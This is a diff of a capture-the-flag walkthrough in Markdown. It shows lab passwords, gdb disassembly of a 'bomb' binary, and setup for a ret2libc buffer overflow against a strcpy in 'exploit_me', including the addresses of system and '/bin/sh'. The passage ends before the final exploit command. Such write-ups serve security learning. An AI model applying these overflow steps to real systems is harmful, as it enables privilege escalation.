@@ -74,14 +74,18 @@ And the name of this script is "build_program.py". Run it to get full program.
 Compile and run this program. Got "Iheartpwnage" password and advice to use sha-256.
 
 ### laurie
+```
 echo -n "Iheartpwnage" | shasum -a 256
+```
 laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
 There is bomb here. Bomb contains of 6 phases. We should input correct key in each stage.
-
+```
 scp -P 2222 laurie@127.0.0.1:bomb ./
+```
 
 gdb bomb
+
     disas main
     disas phase_1
     x/1cs 0x80497c0
@@ -130,19 +134,22 @@ README says to remove spaces when we have FULL the password. Ok, lets concatenat
 
 ### thor
 Use our "parse_turtle_steps.py" script and look at word "SLASH".
+```
 md5 -s SLASH -> "646da671ca01bb5d84dbb5fb2238dc8e" password for zaz.
+```
 
 ### zaz
 You can see expolit_me file there. This program takes argument and prints it. With decompiled code we can see that there is only 140 bytes buffer inside main. And strcpy uses here. Excellent opportunity to overflow buffer and use ret2lib exploit.
 
 We need to know system command adress and '/bin/bash' string address.
-```
+
 gdb exploit_me
+
     break main
     run
     print &system                           > 0xb7e6b060 > '\xb7\xe6\xb0\x60'
     find &system, +9999999, "/bin/sh"       > 0xb7f8cc58 > '\xb7\xf8\xcc\x58'
-```
+
 
 Now we can run this command
 ```
